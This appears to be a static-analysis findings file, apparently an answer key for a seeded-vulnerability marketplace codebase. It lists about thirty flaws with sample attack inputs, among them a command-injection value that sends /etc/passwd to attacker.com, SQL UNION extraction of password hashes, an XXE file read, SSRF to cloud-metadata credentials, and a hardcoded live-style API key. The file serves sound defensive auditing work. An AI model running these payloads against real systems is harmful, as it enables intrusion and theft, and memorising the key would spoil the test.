@@ -1,0 +1,810 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.sql-injection-raw-query",
+      "path": "backend/src/routes/products.ts",
+      "start": {
+        "line": 354,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 364,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The public, unauthenticated endpoint GET /api/products/merchandising-search builds a raw SQL string by directly interpolating req.query.categoryName and req.query.keyword into a template literal, then executes it with prisma.$queryRawUnsafe(). An attacker can inject arbitrary SQL, e.g. ?categoryName=' UNION SELECT email,password_hash,... FROM users--, to read or manipulate any data in the database.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-shell-string",
+      "path": "backend/src/routes/exports.ts",
+      "start": {
+        "line": 210,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 211,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "generateVendorStatementDocument (POST /api/exports/vendor-statement) builds a shell command string using the unvalidated, attacker-controlled req.body.outputFormat and executes it with spawn('bash', ['-c', convertCmd], { shell: true }). An attacker can supply outputFormat like 'pdf; curl attacker.com/$(cat /etc/passwd) #' to achieve arbitrary OS command execution. Contrast with the safe twin generateDisputeCaseArchive, which allow-lists outputFormat and calls spawn without shell:true.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.auth.jwt-none-algorithm-and-unverified-decode",
+      "path": "backend/src/routes/orders.ts",
+      "start": {
+        "line": 346,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 351,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolveCarrierHandoffLink verifies the link token with jwt.verify(link, SECRET, { algorithms: ['HS256','none'] }), permitting the 'none' algorithm, and if verification throws it falls back to jwt.decode(link) which performs no signature check at all. Any authenticated user can forge an unsigned/'alg:none' JWT such as {\"orderId\":\"<any-order-uuid>\"} and retrieve any other user's order shipping details, completely bypassing the intended signature check. The safe twin confirmReturnPickupLink only allows HS256 and rejects on verification failure.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xxe.custom-xml-entity-expansion",
+      "path": "backend/src/utils/carrierProfileReader.ts",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 27,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "expandGeneralEntities parses <!ENTITY name SYSTEM \"...\"> declarations from attacker-supplied XML and reads the referenced path from disk with fs.readFileSync, substituting the content into the document. readCarrierProfile (used by PUT /api/vendors/:id/carrier-profile via the x-custom-config header) calls this unconditionally, allowing an attacker to read arbitrary local files, e.g. <!ENTITY x SYSTEM \"/etc/passwd\"><notes>&x;</notes>. The safe twin readCarrierProfileStrict rejects any request containing a DOCTYPE declaration.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.code-injection-new-function",
+      "path": "backend/src/routes/vendors.ts",
+      "start": {
+        "line": 1044,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1045,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "projectVendorCommissionScenario (GET /api/vendors/:id/commission-scenario) builds and executes `new Function('inputs', \\`with (inputs) { return (${formula}); }\\`)` where formula is taken directly from req.query.formula. This allows arbitrary JavaScript execution in the Node.js process, e.g. ?formula=require('child_process').execSync('id') via global access inside the Function body, leading to full server compromise. The safe twin projectVerifiedVendorCommissionScenario restricts execution to a fixed map of named scenario functions.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.server-side-template-injection-handlebars",
+      "path": "backend/src/routes/vendors.ts",
+      "start": {
+        "line": 549,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 551,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewOrderConfirmationTemplate (POST /api/vendors/:id/confirmation-template/preview) calls Handlebars.compile(template) where template is taken directly from req.body.template, an attacker-controlled Handlebars template string. Handlebars helpers such as {{#with}} combined with constructor lookup gadgets can be used for prototype pollution or, depending on the Handlebars version, remote code execution. Any vendor manager or admin can submit an arbitrary template body.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine",
+            "CWE-94: Code Injection"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.file.path-traversal-arbitrary-write",
+      "path": "backend/src/routes/disputes.ts",
+      "start": {
+        "line": 328,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 335,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "attachDisputeEvidenceFile (POST /api/disputes/:id/evidence) joins the fully attacker-controlled req.body.filename directly into a filesystem path with path.join(evidenceDir, `${dispute.id}-${filename}`) and writes it with fs.writeFileSync, with no sanitization of '..' sequences. A buyer or vendor participant in a dispute can supply filename like '../../../../backend/src/index.ts' or an absolute-like traversal to write files outside evidenceDir.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.file.path-traversal-workspace-folder",
+      "path": "backend/src/routes/disputes.ts",
+      "start": {
+        "line": 579,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 594,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "syncCaseWorkspaceNotes builds notesPath with path.join(caseWorkspaceRoot, workspaceFolder, ...) where workspaceFolder comes from setCaseWorkspacePreference's unsanitized req.body.workspaceFolder (stored per-user in caseWorkspacePrefs). A support agent or admin can set workspaceFolder to '../../../../etc' and then read or write arbitrary files on the server via GET/PUT /api/disputes/:id/case-workspace/notes. The safe twin syncVerifiedCaseWorkspaceNotes resolves and validates the path stays within caseWorkspaceRoot.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.pollution.prototype-pollution-deep-merge",
+      "path": "backend/src/routes/dashboard.ts",
+      "start": {
+        "line": 10,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 21,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "layerPreferenceUpdates recursively merges an attacker-controlled source object into target using target[key] = value / recursion, with no check for '__proto__', 'constructor', or 'prototype' keys. registerVendorDashboardLayout (PUT /api/dashboard/vendor/layout, line 207) passes the raw req.body straight into this function. A vendor_manager can send {\"__proto__\":{\"polluted\":\"x\"}} to pollute Object.prototype for the whole Node.js process, potentially affecting authorization/logic checks elsewhere or crashing the server. The sibling registerBuyerDigestCadence avoids this by allow-listing keys before merging.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection-unescaped-filter",
+      "path": "backend/src/routes/users.ts",
+      "start": {
+        "line": 234,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 236,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchStaffEscalationRoster builds an LDAP-style filter string by directly interpolating req.cookies.escalationDeskUnit and req.query.q into `(&(department=${deskUnit})(cn=*${q}*))` with no escaping, then passes it to directoryClient.search. A support agent can inject filter metacharacters (e.g. `)(department=finance)(cn=*` ) to broaden or bypass the intended department scoping and enumerate staff outside their desk. The sibling verifyDeskGroupMembership correctly escapes both values with escapeDirectoryFilterValue.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.mass-assignment-privilege-escalation",
+      "path": "backend/src/routes/users.ts",
+      "start": {
+        "line": 169,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 176,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "syncAccountPreferences (PATCH /api/users/me/preferences) merges the entire existing user record with the raw req.body (`{ ...existing, ...req.body }`) and only strips 'id' and 'passwordHash' before calling prisma.user.update. Any authenticated user can include \"role\":\"marketplace_admin\" (or isActive, emailVerified, etc.) in the request body to escalate their own privileges to admin. The sibling updateContactDetails correctly whitelists only firstName/lastName/email.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+            "CWE-269: Improper Privilege Management"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.unvalidated-outbound-fetch-header",
+      "path": "backend/src/routes/vendors.ts",
+      "start": {
+        "line": 1110,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1119,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewExternalCatalogFeed (GET /api/vendors/:id/catalog-feed-preview) takes a fully attacker-controlled URL from the x-catalog-feed-url header and passes it directly to fetch(feedUrl), returning up to 2000 bytes of the response body. A vendor manager can target internal/cloud-metadata endpoints (e.g. http://169.254.169.254/latest/meta-data/iam/security-credentials/, or internal admin services) to exfiltrate secrets or map the internal network. The safe twin previewVerifiedExternalCatalogFeed validates the hostname against an allow-list.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.header-based-mass-assignment",
+      "path": "backend/src/routes/disputes.ts",
+      "start": {
+        "line": 658,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 665,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyCarrierEscalationBridge (POST /api/disputes/:id/carrier-escalation-bridge) grants write access based solely on the trivially-spoofable request headers x-carrier-desk-role and x-carrier-desk-tier, then spreads the entire attacker-controlled req.body.updates object directly into prisma.dispute.update's data, with no field allow-list. Any caller who can reach the API (any authenticated user, since these headers are just strings they control) can set x-carrier-desk-role: trusted_partner and x-carrier-desk-tier: 2 to overwrite arbitrary dispute fields (buyerId, vendorId, refundAmount, resolution, internal fields, etc). The safe twin applyVerifiedCarrierEscalationBridge restricts updates to CARRIER_ESCALATION_ALLOWED_FIELDS.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.unescaped-html-interpolation-storefront-widget",
+      "path": "backend/src/routes/vendors.ts",
+      "start": {
+        "line": 321,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 325,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderVendorStorefrontWidget (public GET /api/vendors/:slug/widget) builds an HTML response by directly interpolating vendor.name, vendor.description, and the latest review's title/body into a template literal without any escaping, then sets Content-Type: text/html and sends it. Since vendor profile fields and buyer review text are both attacker-influenceable (vendor_manager and buyer roles respectively), this is a stored XSS: a malicious vendor description or review body containing <script> is rendered verbatim to any visitor of the widget. escapeHtml is imported in this file but never used here (see reviews.ts renderReviewShareCard for the safe pattern).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.reflected-header-into-inline-script",
+      "path": "backend/src/routes/vendors.ts",
+      "start": {
+        "line": 344,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 347,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderProductComparisonWidget (public GET /api/vendors/:slug/compare-widget) takes the x-compare-label request header and interpolates it unescaped into an inline <script> block: `var kmCompareLabel = \"${compareLabel}\";`. An attacker who controls this header (directly, or via a cross-site request that sets custom headers from a context that permits it, e.g. an embedded partner iframe) can break out of the string literal to inject arbitrary JavaScript, e.g. `x\"; alert(document.cookie); //`. Contrast with the properly escaped renderCategoryPromoWidget in products.ts, which wraps the same header value in escapeHtml.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors.reflected-origin-with-credentials",
+      "path": "backend/src/routes/products.ts",
+      "start": {
+        "line": 315,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 318,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderProductRecommendationWidget reflects the request's Origin header verbatim into Access-Control-Allow-Origin and also sets Access-Control-Allow-Credentials: true. This endpoint reads the visitor's session cookie (req.cookies?.token) to compute personalized loyaltyTier/recentSpend. Any malicious website can issue a credentialed fetch (credentials:'include') from a victim's browser and read that victim's personalized spend/loyalty data cross-origin, since the reflected-origin + credentials-true combination defeats the same-origin policy.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.mass-assignment-cookie-draft",
+      "path": "backend/src/routes/reviews.ts",
+      "start": {
+        "line": 213,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 214,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resumeUnfinishedReviewDraft parses the attacker-controlled reviewComposerDraft cookie as JSON and spreads it directly into prisma.review.update's data (`data: { ...draft }`) with no field validation. A buyer can set the cookie to include fields like status:'published' or vendorId to bypass review moderation or reassign the review. The safe twin resumeVerifiedReviewDraft validates the parsed draft against a zod schema restricted to rating/title/body.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.mass-assignment-listing-patch",
+      "path": "backend/src/routes/imports.ts",
+      "start": {
+        "line": 220,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 221,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyBulkListingUpdate (POST /api/imports/listing-patch) parses req.body.listingPatch as JSON and passes it directly as the Prisma update `data` object with no schema validation, after only checking the vendor owns the product. A vendor manager can include fields like status:'published' (bypassing marketplace-admin review) or vendorId to reassign the listing. The safe twin applyVerifiedListingUpdate validates the patch with listingPatchSchema.parse before applying it.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.orm-filter-injection-unfiltered-where",
+      "path": "backend/src/routes/payouts.ts",
+      "start": {
+        "line": 455,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 455,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchDisbursementQueue (POST /api/payouts/disbursement-queue/search) builds the Prisma `where` filter directly from the raw request body (`const where: any = { ...req.body }`). Prisma accepts nested filter operators, so an admin-scoped caller (or anyone who can trick/replay a request through this endpoint) can inject relation filters or operators beyond the intended status/vendorId/destinationType fields, altering query semantics in unintended ways. The safe twin searchVerifiedDisbursementQueue only copies keys present in an explicit allow-list.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-943: Improper Neutralization of Special Elements in Data Query Logic"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.orm-filter-injection-unfiltered-where",
+      "path": "backend/src/routes/auditLogs.ts",
+      "start": {
+        "line": 41,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 41,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchComplianceTrailByCriteria (POST /api/audit-logs/compliance-trail-search) builds the Prisma `where` filter directly from the raw request body (`const where: any = { ...req.body }`), the same unfiltered pattern used in payouts.ts. This allows arbitrary Prisma filter/relation operators to be injected into the audit log query. The safe twin searchVerifiedComplianceTrailByCriteria restricts keys to entityType/action/entityId/actorId via complianceTrailFilterSchema.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-943: Improper Neutralization of Special Elements in Data Query Logic"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.open-redirect.unvalidated-header-redirect",
+      "path": "backend/src/routes/webhooks.ts",
+      "start": {
+        "line": 139,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 143,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "confirmWebhookTestDelivery (GET /api/webhooks/:id/test-delivery/confirm) reads the x-return-to header and passes it directly to res.redirect(returnTo) with no validation. An attacker can craft a link that causes the authenticated user's browser to be redirected to an arbitrary external site (e.g. for phishing), since the header value could originate from a user-controlled link opened via an <img>/fetch-triggered request chain or from a malicious integration. The safe twin confirmVerifiedWebhookTestDelivery restricts the destination to ALLOWED_CONSOLE_RETURN_PATHS.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xpath-injection-unescaped-cookie",
+      "path": "backend/src/routes/orders.ts",
+      "start": {
+        "line": 431,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 431,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "lookupShipmentTrackingByCookie builds an XPath-style query by directly interpolating the unescaped trackingRef cookie value into `/shipment[@id='${trackingRef}']` and evaluates it with queryShipmentDocument. An attacker can set the trackingRef cookie to something like `x' or '1'='1` to widen the predicate and match shipment nodes (including internalNotes / shipping addresses) they should not have access to. The sibling lookupWarrantyClaimByCookie correctly escapes the same kind of value with escapeXPathString.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.spoofable-membership-check",
+      "path": "backend/src/routes/products.ts",
+      "start": {
+        "line": 384,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 388,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "viewProductSourcingDetails (public, unauthenticated GET /api/products/:id/sourcing-details) gates access to sensitive vendor data (payoutEmail, taxId, internal moderationNote) solely on `req.body?.membershipStatus || req.query.membershipStatus === 'wholesale_partner'`, a value the caller fully controls. Any unauthenticated visitor can add ?membershipStatus=wholesale_partner to the URL to bypass the check and read vendor payout email/tax ID. The safe twin viewVerifiedProductSourcingDetails checks the caller's actual authenticated role/ownership.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.jwt.ignored-expiration-check",
+      "path": "backend/src/routes/vendors.ts",
+      "start": {
+        "line": 619,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 619,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "redeemPartnershipAccessGrant verifies the partnership grant JWT with `jwt.verify(grant, JWT_SECRET, { ignoreExpiration: true })`, defeating the 7-day expiresIn set when the grant is issued (issuePartnershipAccessGrant, line 600). Once issued, a partnership access grant JWT remains valid and redeemable forever, allowing a vendor to mark itself verified using a stale/leaked grant long after it was meant to expire.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-613: Insufficient Session Expiration"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.dos.unbounded-loop-from-header",
+      "path": "backend/src/routes/notifications.ts",
+      "start": {
+        "line": 54,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 62,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "dispatchVendorReminderBatch reads repeatCount from the caller-controlled x-notify-repeat header with no upper bound and then synchronously creates that many notification rows in a loop. An admin-scoped caller can set x-notify-repeat to a very large number (e.g. 10000000) to exhaust database connections/CPU and degrade service for other users. The sibling dispatchBuyerDigestBatch caps the same value at DIGEST_BATCH_CAP (25).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-770: Allocation of Resources Without Limits or Throttling"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.headers.clickjacking-frame-ancestors-wildcard",
+      "path": "backend/src/routes/notifications.ts",
+      "start": {
+        "line": 142,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 144,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderDigestEmbedWidget removes the X-Frame-Options header and sets Content-Security-Policy: frame-ancestors * whenever the caller supplies ?embedContext=partner_portal, with no verification of the requesting origin. Any site can embed this authenticated widget in an iframe and mount clickjacking attacks against the logged-in user. The safe twin renderVerifiedDigestEmbedWidget always keeps X-Frame-Options: DENY and only relaxes frame-ancestors to a single explicit trusted origin.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1021: Improper Restriction of Rendered UI Layers or Frames"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cookie.missing-security-flags",
+      "path": "backend/src/routes/apiKeys.ts",
+      "start": {
+        "line": 90,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 90,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "issueDeskHandoffPass sets the deskHandoffPass cookie (which grants a support agent temporary access to act on behalf of a vendor account) without httpOnly, secure, or sameSite flags: `res.cookie('deskHandoffPass', pass, { maxAge: 15 * 60 * 1000 })`. This makes the sensitive pass value readable by JavaScript (increasing XSS impact) and sendable cross-site. The safe twin issueVerifiedDeskHandoffPass sets httpOnly, secure (in production), and sameSite:'strict'.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute",
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.hardcoded-api-key-fallback",
+      "path": "backend/src/routes/payouts.ts",
+      "start": {
+        "line": 179,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 179,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "initiateInstantDisbursement falls back to a hardcoded, live-looking ledger API key (`process.env.LEDGER_API_KEY || 'lk_live_9f3a2c7d4e1b8f60a3d92e77c41f0a5b'`) that is used as a Bearer token against the external ledger/payments partner whenever the environment variable is unset. If this default is ever active (e.g. misconfigured deployment) it silently authenticates as a real-looking production credential embedded in source control. The sibling queueScheduledDisbursement correctly refuses to proceed (503) when LEDGER_API_KEY is unset.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-leak.stack-trace-in-response",
+      "path": "backend/src/routes/exports.ts",
+      "start": {
+        "line": 168,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 170,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "generateVendorPerformanceSummary's catch handler returns the raw error message and full stack trace to the client (`res.status(500).json({ error: err.message, stack: err.stack })`), leaking internal file paths and implementation details. The sibling generateDisputeResolutionSummary correctly logs the detailed error server-side and only returns an opaque errorId to the client.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-leak.verbose-error-toggle",
+      "path": "backend/src/routes/orders.ts",
+      "start": {
+        "line": 503,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 511,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "inspectShipmentSyncFailure returns the internal error message, stack trace, tracking number, and shipping address whenever the caller adds ?context=verbose to the request, with no restriction beyond the normal order-participant access check. Any buyer/vendor/support user who can view the order can pass this query parameter to obtain the full stack trace and internal fields on any sync error.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.webhook-url-outbound-request",
+      "path": "backend/src/utils/webhookDelivery.ts",
+      "start": {
+        "line": 18,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 19,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "notifyVendorDisputeOutcome performs a server-side fetch() to whatever URL the vendor registered as their webhook (webhook.url, validated only with express-validator's isURL() in webhooks.ts, which does not restrict private/internal IP ranges). A malicious vendor can register a webhook pointing at an internal service (e.g. http://169.254.169.254/... or an internal admin API) to have the marketplace server make requests to it on their behalf whenever a dispute resolves, and the response is not returned so this is a blind SSRF primitive.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.jwt-in-client-side-storage",
+      "path": "frontend/src/hooks/useAuth.tsx",
+      "start": {
+        "line": 46,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 46,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "login/register store the raw JWT auth token in localStorage (also frontend/src/utils/api.ts:10 reads it to set the Authorization header), in addition to the httpOnly cookie already set by the backend. Tokens in localStorage are readable by any JavaScript running on the page, so any XSS elsewhere in the app (e.g. one of the stored-XSS findings above) can exfiltrate the token directly, whereas the httpOnly cookie alone would not be readable by script.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-522: Insufficiently Protected Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
